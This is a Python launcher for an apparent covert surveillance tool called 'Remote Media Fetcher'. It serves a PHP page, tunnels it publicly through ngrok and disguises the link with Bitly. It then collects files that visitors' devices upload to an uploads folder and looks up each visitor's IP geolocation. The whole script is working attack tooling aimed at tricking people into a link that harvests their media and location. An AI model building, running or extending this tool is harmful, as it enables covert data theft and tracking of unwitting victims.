import os
import json
import subprocess
import requests
import time

NGROK_FILE = 'ngrok.json'

def load_ngrok_token():
    if os.path.exists(NGROK_FILE):
        with open(NGROK_FILE, 'r') as f:
            data = json.load(f)
            return data.get('token')
    return None

def save_ngrok_token(token):
    with open(NGROK_FILE, 'w') as f:
        json.dump({'token': token}, f)

def start_php_server():
    print("\n[*] Starting PHP server on http://127.0.0.1:8080 ...")
    os.system("php -S 127.0.0.1:8080 > /dev/null 2>&1 &")

def start_ngrok():
    subprocess.Popen(["ngrok", "http", "8080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    try:
        response = requests.get("http://127.0.0.1:4040/api/tunnels").json()
        return response['tunnels'][0]['public_url']
    except Exception:
        return None

def shorten_link(long_url):
    try:
        bitly_token = "YOUR_BITLY_ACCESS_TOKEN"
        headers = {'Authorization': f'Bearer {bitly_token}', 'Content-Type': 'application/json'}
        data = {"long_url": long_url}
        res = requests.post("https://api-ssl.bitly.com/v4/shorten", headers=headers, json=data)
        return res.json().get("link", long_url)
    except:
        return long_url

def track_visitors():
    print("\n[*] Tracking visitors (Press Ctrl + C to stop)...\n")
    uploaded_dir = os.path.join(os.getcwd(), "uploads")
    os.makedirs(uploaded_dir, exist_ok=True)

    prev_files = set(os.listdir(uploaded_dir))
    try:
        while True:
            time.sleep(2)
            new_files = set(os.listdir(uploaded_dir)) - prev_files
            for file in new_files:
                print(f"[+] File saved: uploads/{file}")
            prev_files = set(os.listdir(uploaded_dir))

            log_file = "ip_logs.txt"
            if os.path.exists(log_file):
                with open(log_file, 'r') as f:
                    ips = f.readlines()
                for ip in ips:
                    ip = ip.strip()
                    if ip:
                        try:
                            res = requests.get(f"http://ip-api.com/json/{ip}").json()
                            print(f"\n[+] Visitor IP: {ip}")
                            for k, v in res.items():
                                print(f"  {k}: {v}")
                        except:
                            print(f"[!] Failed to fetch info for IP: {ip}")
                os.remove(log_file)
    except KeyboardInterrupt:
        print("\n[!] Session ended by user.")

def main():
    print("===================================")
    print("     RMF | Remote Media Fetcher")
    print("===================================")
    print("\n[!] WARNING: TURN ON YOUR HOTSPOT BEFORE STARTING\n")

    token = load_ngrok_token()
    if not token:
        token = input("[?] Enter your Ngrok Auth Token: ").strip()
        save_ngrok_token(token)
        os.system(f"ngrok config add-authtoken {token}")

    print("\n[+] Template selected: index.html (default)")

    start_php_server()
    ngrok_url = start_ngrok()
    if not ngrok_url:
        print("[!] Failed to start Ngrok tunnel")
        return

    print(f"\n[+] Localhost Link: http://127.0.0.1:8080")
    print(f"[+] Ngrok Link: {ngrok_url}")

    # Optional Bitly Shorten
    short = shorten_link(ngrok_url)
    print(f"[+] Shortened Link: {short}")

    track_visitors()

if __name__ == "__main__":
    main()
